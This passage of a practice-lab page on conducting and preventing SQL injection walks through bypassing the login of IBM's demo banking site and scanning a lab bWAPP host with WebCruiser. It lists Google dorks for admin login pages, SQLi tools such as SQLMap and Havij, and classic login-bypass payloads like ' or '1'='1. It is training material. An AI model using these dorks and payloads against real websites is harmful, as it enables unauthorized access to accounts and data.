+<p id="cn-m17-279">Many commercial and open-source tools are available to help you automate SQL Injection attacks and bypass website logins. However, you can also use simple queries to bypass web application logins. Do note that manual SQL queries may require a significant amount of effort as you may have to try multiple before you succeed.</p>
+<p id="cn-m17-280">Tools for SQL Injection automation include:</p>
+<ul id="cn-m17-281">
+<li id="cn-m17-281">SQLDict</li>
+<li id="cn-m17-282">SQLSmack</li>
+<li id="cn-m17-283">SQLPing 2</li>
+<li id="cn-m17-284">SQLMap</li>
+<li id="cn-m17-285">Havij</li>
+</ul>
+<p id="cn-m17-286">You can use Google dorks for SQL injection, which can be found on the Google Hacking Database.</p>
+<p id="cn-m17-287">Common Google dorks include:</p>
+<ul id="cn-m17-288">
+<li id="cn-m17-288">inurl:admin.asp</li>
+<li id="cn-m17-289">inurl:login/admin.asp</li>
+<li id="cn-m17-290">inurl:admin/login.asp</li>
+<li id="cn-m17-291">inurl:adminlogin.asp</li>
+<li id="cn-m17-292">inurl:adminhome.asp</li>
+<li id="cn-m17-293">inurl:admin_login.asp</li>
+<li id="cn-m17-294">inurl:administratorlogin.asp</li>
+<li id="cn-m17-295">inurl:login/administrator.asp</li>
+<li id="cn-m17-296">inurl:administrator_login.asp</li>
+</ul>
+<p id="cn-m17-297">You would also need to know SQL injection queries, including:</p>
+<ul id="cn-m17-298">
+<li id="cn-m17-298">‘or’’=’</li>
+<li id="cn-m17-299">admin'--</li>
+<li id="cn-m17-300">' or '1'='1</li>
+<li id="cn-m17-301">' or 'x'='x</li>
+<li id="cn-m17-302">' or 'x'='x</li>
+<li id="cn-m17-303">" or "x"="x</li>
+<li id="cn-m17-304">') or ('x'='x</li>
+<li id="cn-m17-305">' or 1=1--</li>
+<li id="cn-m17-306">" or 1=1--</li>
+<li id="cn-m17-307">or 1=1--</li>
+</ul>
+<p id="cn-m17-308">In this task, you will bypass web application logins using <b>SQL Injection</b>. To bypass web application logins using <b>SQL Injection</b>, perform the following steps:</p>
+<h4 id="cn-m17-309"><b><i>Step 1</i></b></h4>
+<p id="cn-m17-310">Reconnect to <b>PLABWIN10 </b>and open a new tab in <b>Microsoft Edge</b>.</p>
+<p id="cn-m17-311"></p><figure><img class="cn-img" id="cn-image-m17-c-34" src="./Print content_files/image-m17-c-34.jpg" alt="Figure 1.35 Screenshot of PLABWIN10: Clicking the New tab option in the Microsoft Edge window."><figcaption>Figure 1.35 Screenshot of PLABWIN10: Clicking the New tab option in the Microsoft Edge window.</figcaption></figure><p></p>
+<h4 id="cn-m17-313"><b><i>Step 2</i></b></h4>
+<p id="cn-m17-314">In the address bar, type the following URL:</p>
+<pre id="cn-m17-315"><code>http://demo.testfire.net/bank/main.aspx
+</code></pre>
+<p id="cn-m17-316">Press <b>Enter</b>.</p>
+<p id="cn-m17-317">The login page for the demo banking site is displayed.</p>
+<span class="cn-quote" id="cn-m17-318"><b><i>Note</i></b><i>: This site is not a real banking site. The Altoro web application is published by the IBM Corporation for the sole purpose of demonstrating the effectiveness of IBM products in detecting web application vulnerabilities and website defects. </i></span>
+<p id="cn-m17-319"></p><figure><img class="cn-img" id="cn-image-m17-c-35" src="./Print content_files/image-m17-c-35.jpg" alt="Figure 1.36 Screenshot of PLABWIN10: Showing the demo bank web application."><figcaption>Figure 1.36 Screenshot of PLABWIN10: Showing the demo bank web application.</figcaption></figure><p></p>
+<h4 id="cn-m17-321"><b><i>Step 3</i></b></h4>
+<p id="cn-m17-322">You will now bypass the login using SQL queries. As you do not know a valid username and password, you inject the SQL statement and bypass the login.</p>
+<p id="cn-m17-323">Complete the instructions below.</p>
+<p id="cn-m17-324">In the <b>Username </b>textbox, type the following:</p>
+<pre id="cn-m17-325"><code>admin
+</code></pre>
+<p id="cn-m17-326">In the <b>Password </b>textbox, type the following:</p>
+<pre id="cn-m17-327"><code>' or '1'='1
+</code></pre>
+<p id="cn-m17-328">This web application uses an authentication form. In this case, since you are logging in as admin, you are attempting to access the administration section. As a normal authentication process, this web application needs to perform two tasks:</p>
+<ul id="cn-m17-329">
+<li id="cn-m17-329">Accept a valid username and password from the user</li>
+<li id="cn-m17-330">Send the username and password in the form of a query to the database for validation</li>
+</ul>
+<p id="cn-m17-331">The following query is being used for validating:</p>
+<pre id="cn-m17-332"><code>SELECT * FROM admin WHERE username = '[USER ENTRY]' AND password = '[USER ENTRY]'
+</code></pre>
+<p id="cn-m17-333">After receiving the inputs from you, the web application login page sends the information to the database in the following format:</p>
+<pre id="cn-m17-334"><code>SELECT * FROM admin WHERE username = 'admin' AND password = '’or ’1’=’1’'
+</code></pre>
+<p id="cn-m17-335">Select the <b>Login </b>button.</p>
+<span class="cn-quote" id="cn-m17-336"><b><i>Note</i></b><i>: If a notification appears regarding storing the password, click Not for this site.</i></span>
+<p id="cn-m17-337"></p><figure><img class="cn-img" id="cn-image-m17-c-36" src="./Print content_files/image-m17-c-36.jpg" alt="Figure 1.37 Screenshot of PLABWIN10: Entering login information."><figcaption>Figure 1.37 Screenshot of PLABWIN10: Entering login information.</figcaption></figure><p></p>
+<h4 id="cn-m17-339"><b><i>Step 4</i></b></h4>
+<p id="cn-m17-340">After successful authentication, you are now logged in as the <b>admin </b>user.</p>
+<p id="cn-m17-341"></p><figure><img class="cn-img" id="cn-image-m17-c-37" src="./Print content_files/image-m17-c-37.jpg" alt="Figure 1.38 Screenshot of PLABWIN10: Showing admin as the logged in user."><figcaption>Figure 1.38 Screenshot of PLABWIN10: Showing admin as the logged in user.</figcaption></figure><p></p>
+<span class="atom-code hidden">9cb5a901-19ee-4901-bfb4-3679013ff687</span>
+<span class="cn-alert" id="cn-m17-345">Close <b>Microsoft Edge </b>and proceed to the next exercise.</span>
+<div class="print-exercise-break"></div><h2 class="exercise-title" id="cn-m17-346"><b>Exercise 2 - Prevent SQL Injection Attacks</b></h2>
+<p id="cn-m17-347">There are various scenarios in which an SQL Injection attack can occur. For example, when it is entered, user-supplied data is not validated or sanitized by the Web application. Another example can be SQL commands used in dynamic queries or stored procedures.</p>
+<p id="cn-m17-348">Several methods can be used to prevent an SQL Injection attack. One of the key applications is IBM AppScan, which can find web application vulnerabilities.</p>
+<p id="cn-m17-349">In this exercise, you will learn about the methods to prevent an SQL Injection attack.</p>
+<h2 class="cn-learningobjectives"><b>Learning Outcomes</b></h2>
+<p id="cn-m17-351">After completing this exercise, you will be able to:</p>
+<ul id="cn-m17-352">
+<li id="cn-m17-352">Use WebCruiser to Detect SQL Injection</li>
+</ul>
+<p id="cn-m17-353">After completing this exercise, you will have further knowledge of:</p>
+<ul id="cn-m17-354">
+<li id="cn-m17-354">Methods to Prevent SQL Injection</li>
+</ul>
+<h2 class="cn-devices"><b>Your Devices</b></h2>
+<p id="cn-m17-356">You will be using the following devices in this lab. Please power these on now.</p>
+<span class="atom-code hidden">e19aea1d-af66-45cd-9c91-6c719a51449f</span>
+<span class="atom-code hidden">891d016b-a51a-4990-a4c0-ffb0be26a55d</span>
+<h3 id="cn-m17-361"><b>Task 1 - Use WebCruiser to Detect SQL Injection</b></h3>
+<p id="cn-m17-362">WebCruiser is an application vulnerability scanning tool. It can help you audit a web application for vulnerabilities that may exist. It can scan for the common web application vulnerabilities, such as SQL injection, cross-site scripting, buffer overflow, and flash/flex application and Web 2.0 exposure scans.</p>
+<p id="cn-m17-363">In this task, you will learn to use WebCruiser. To do this, perform the following steps:</p>
+<h4 id="cn-m17-364"><b><i>Step 1</i></b></h4>
+<p id="cn-m17-365">Make sure all required devices are powered on and reconnect to <b>PLABWIN10.</b></p>
+<p id="cn-m17-366">Open <b>File Explorer </b>by clicking on the icon on the taskbar.</p>
+<p id="cn-m17-367"></p><figure><img class="cn-img" id="cn-image-m17-c-38" src="./Print content_files/image-m17-c-38.jpg" alt="Figure 2.1 Screenshot of PLABWIN10: Desktop, searching the system for Microsoft Edge."><figcaption>Figure 2.1 Screenshot of PLABWIN10: Desktop, searching the system for Microsoft Edge.</figcaption></figure><p></p>
+<h4 id="cn-m17-369"><b><i>Step 2</i></b></h4>
+<p id="cn-m17-370">In <b>File Explorer</b>, navigate to the <b>C:/Tools/WebCruiser/WebCruiserWVS </b>folder and double-click the <b>WebCruiserWVS </b>application file.</p>
+<p id="cn-m17-371"></p><figure><img class="cn-img" id="cn-image-m17-c-39" src="./Print content_files/image-m17-c-39.jpg" alt="Figure 2.2 Screenshot of PLABWIN10: Showing File Explorer in the C:/Tools/WebCruiser.WebCruiserWVS folder. The WebCruiserWVS application is highlighted."><figcaption>Figure 2.2 Screenshot of PLABWIN10: Showing File Explorer in the C:/Tools/WebCruiser.WebCruiserWVS folder. The WebCruiserWVS application is highlighted.</figcaption></figure><p></p>
+<h4 id="cn-m17-373"><b><i>Step 11</i></b></h4>
+<p id="cn-m17-374">The <b>WebCruiser - Web Vulnerability Scanner Free Edition </b>window is displayed.</p>
+<p id="cn-m17-375"></p><figure><img class="cn-img" id="cn-image-m17-c-40" src="./Print content_files/image-m17-c-40.jpg" alt="Figure 2.3 Screenshot of PLABWIN10: Showing WebCruiser - Web Vulnerability Scanner Free Edition window."><figcaption>Figure 2.3 Screenshot of PLABWIN10: Showing WebCruiser - Web Vulnerability Scanner Free Edition window.</figcaption></figure><p></p>
+<h4 id="cn-m17-377"><b><i>Step 12</i></b></h4>
+<p id="cn-m17-378">In the left-hand pane, select <b>SQL Injection </b>and then in the <b>URL </b>textbox, type the following URL:</p>
+<pre id="cn-m17-379"><code>http://192.168.0.10/bWAPP/sqli_1.php?title=&amp;action=Search
+</code></pre>
+<p id="cn-m17-380">Click <b>Setting</b>.</p>
+<p id="cn-m17-381"></p><figure><img class="cn-img" id="cn-image-m17-c-41" src="./Print content_files/image-m17-c-41.jpg" alt="Figure 2.4 Screenshot of PLABWIN10: Entering the URL in the URL textbox and clicking the Setting tab."><figcaption>Figure 2.4 Screenshot of PLABWIN10: Entering the URL in the URL textbox and clicking the Setting tab.</figcaption></figure><p></p>
+<h4 id="cn-m17-383"><b><i>Step 13</i></b></h4>
+<p id="cn-m17-384">On the <b>Scanner </b>tab, select <b>Scan Obsolete Backup files (Potential Information Leakage) </b>and select <b>Save &amp; Apply Settings.</b></p>
+<p id="cn-m17-385"></p><figure><img class="cn-img" id="cn-image-m17-c-42" src="./Print content_files/image-m17-c-42.jpg" alt="Figure 2.5 Screenshot of PLABWIN10: Select the Scan Obsolete Backup files (Potential Information Leakage) option and clicking Save &amp;amp; Apply Settings."><figcaption>Figure 2.5 Screenshot of PLABWIN10: Select the Scan Obsolete Backup files (Potential Information Leakage) option and clicking Save &amp; Apply Settings.</figcaption></figure><p></p>
+<h4 id="cn-m17-387"><b><i>Step 14</i></b></h4>
+<p id="cn-m17-388">On the <b>Done </b>dialog box, click <b>OK</b>.</p>
+<p id="cn-m17-389"></p><figure><img class="cn-img" id="cn-image-m17-c-43" src="./Print content_files/image-m17-c-43.jpg" alt="Figure 2.6 Screenshot of PLABWIN10: Clicking OK on the Done dialog box."><figcaption>Figure 2.6 Screenshot of PLABWIN10: Clicking OK on the Done dialog box.</figcaption></figure><p></p>
+<h4 id="cn-m17-391"><b><i>Step 15</i></b></h4>
+<p id="cn-m17-392">Click <b>ScanSite </b>on the far right-hand side of the page.</p>
+<p id="cn-m17-393"></p><figure><img class="cn-img" id="cn-image-m17-c-44" src="./Print content_files/image-m17-c-44.jpg" alt="Figure 2.7 Screenshot of PLABWIN10: Selecting ScanSite."><figcaption>Figure 2.7 Screenshot of PLABWIN10: Selecting ScanSite.</figcaption></figure><p></p>
+<h4 id="cn-m17-396"><b><i>Step 16</i></b></h4>
+<p id="cn-m17-397">On the <b>Confirm </b>dialog box, review the settings.</p>
+<p id="cn-m17-398"></p><figure><img class="cn-img" id="cn-image-m17-c-45" src="./Print content_files/image-m17-c-45.jpg" alt="Figure 2.8 Screenshot of PLABWIN10: Showing the Software Disclaimer window. Ok is highlighted."><figcaption>Figure 2.8 Screenshot of PLABWIN10: Showing the Software Disclaimer window. Ok is highlighted.</figcaption></figure><p></p>
+<h4 id="cn-m17-400"><b><i>Step 17</i></b></h4>
+<p id="cn-m17-401">Select <b>OK</b>.</p>
+<p id="cn-m17-402">The scanning process starts and discovers two vulnerabilities.</p>
+<p id="cn-m17-403"></p><figure><img class="cn-img" id="cn-image-m17-c-46" src="./Print content_files/image-m17-c-46.jpg" alt="Figure 2.9 Screenshot of PLABWIN10: Showing results of the scan."><figcaption>Figure 2.9 Screenshot of PLABWIN10: Showing results of the scan.</figcaption></figure><p></p>
+<h4 id="cn-m17-405"><b><i>Step 18</i></b></h4>
+<p id="cn-m17-406">Select a vulnerability in the middle pane. Notice that the above pane displays the description of the vulnerability.</p>
+<p id="cn-m17-407">The vulnerability shown in an obsolete backup which could allow information leakage.</p>
+<p id="cn-m17-408"></p><figure><img class="cn-img" id="cn-image-m17-c-47" src="./Print content_files/image-m17-c-47.jpg" alt="Figure 2.10 Screenshot of PLABWIN10: Selecting a vulnerability."><figcaption>Figure 2.10 Screenshot of PLABWIN10: Selecting a vulnerability.</figcaption></figure><p></p>
+<span class="cn-quote" id="cn-m17-410"><b><i>Note</i></b><i>: You can resize the panes to view more information.</i></span>
+<span class="atom-code hidden">9cb5a901-19ee-4901-bfb4-3679013ff687</span>
+<h3 id="cn-m17-413"><b>Methods to Prevent SQL Injection</b></h3>
+<p id="cn-m17-414">There are several methods to prevent SQL Injection. The Open Web Application Security Project (OWASP) suggests several SQL Injection prevention methods, which are:</p>
+<span class="atom-code hidden">9f905e6e-1c5b-4303-9f4c-c1f33f5f975d</span>
+<span class="atom-code hidden">0bd6c551-0b76-4efc-8a1f-24307e3ed2e6</span>
+<div class="print-exercise-break"></div><h2 class="exercise-title" id="cn-m17-419"><b>Review</b></h2>
+<p id="cn-m17-420">Well done, you have completed the <b>Conducting SQL Injection Attacks </b>Practice Lab.</p>
+<span class="atom-code hidden">b6bdcc5f-bc75-41ea-b62a-7f6d843882b4</span>
+<span class="atom-code hidden">5370ff7e-509b-4e44-8d8f-230ae3b6bb4c</span>
+<span class="atom-code hidden">772af495-4a4e-440a-a0fd-945bae5ba12a</span>
+<span class="atom-code hidden">ed6cbbf4-fcd2-4db4-84d6-a4bc9151c69d</span>
+<span class="atom-code hidden">958b963b-bc3f-40de-ade4-2a24682f5a77</span>
+<span class="atom-code hidden">75f625e3-4efe-433b-98df-5119323bd618</span>
+<span class="atom-code hidden">aaaaaaaa-1111-1111-1111-193f35a24fe3</span>
+<h2 class="cn-summary"><b>Summary</b></h2>
+<p id="cn-m17-431">You completed the following exercises:</p>
+<ul id="cn-m17-432">
+<li id="cn-m17-432">Exercise 1 - Conduct SQL Injection Attacks</li>
+<li id="cn-m17-433">Exercise 2 - Prevent SQL Injection Attacks</li>
+</ul>
+<p id="cn-m17-434">You should now be able to:</p>
+<ul id="cn-m17-435">
+<li id="cn-m17-435">Launch a SQL Injection Attack</li>
+<li id="cn-m17-436">Enumerate the Number of Columns in A Database</li>
+<li id="cn-m17-437">Perform a UNION SQL Injection Attack</li>
+<li id="cn-m17-438">Launch a SQL Injection - Blind - Boolean Attack</li>
+<li id="cn-m17-439">Bypass Website Logins Using SQL Injection</li>
+<li id="cn-m17-440">Use WebCruiser to Detect SQL Injection</li>
+</ul>
+<p id="cn-m17-441">You should now have further knowledge of:</p>
+<ul id="cn-m17-442">
+<li id="cn-m17-442">Methods to Prevent SQL Injection</li>
+</ul>
+<h2 class="cn-feedback"><b>Feedback</b></h2>
+<span class="atom-code hidden">067744a4-4299-4662-b5be-04dbb636a007</span>
+<span class="cn-alert" id="cn-m17-446">Shutdown all virtual machines used in this lab. Alternatively, you can log out of the lab platform.</span>
+
+                </div>
+            </div>
+        
+</div>
+    </div>
+    </form>
+
+
+</body></html>
